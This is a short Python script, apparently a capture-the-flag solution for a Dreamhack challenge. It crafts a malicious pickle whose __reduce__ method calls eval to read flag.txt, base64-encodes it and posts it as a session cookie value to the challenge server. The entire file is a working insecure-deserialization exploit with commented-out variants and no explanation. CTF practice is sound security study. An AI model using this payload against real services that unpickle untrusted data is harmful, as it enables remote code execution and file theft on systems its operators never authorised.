import requests
import base64
import pickle
import os

url = "http://host1.dreamhack.games:8248/check_session"

info = {"name":123}

FLAG="123"

class exploit(object):
    def __reduce__(self):
        return (eval,("{'name':open('flag.txt').read()}",))
        #return (eval,('open("./flag.txt","r").read()',))


def ex():
    #exp = {"name":exploit(),"userid":"123","password":"123"}
    #exp = exploit()
    exp = base64.b64encode(pickle.dumps(exploit())).decode('utf8')
    print(exp)
    #print(pickle.loads(base64.b64decode(exp)))
    data = {'session': exp}
    r = requests.post(url=url,data=data)
    print(r.text)

if __name__ == '__main__':
    ex()
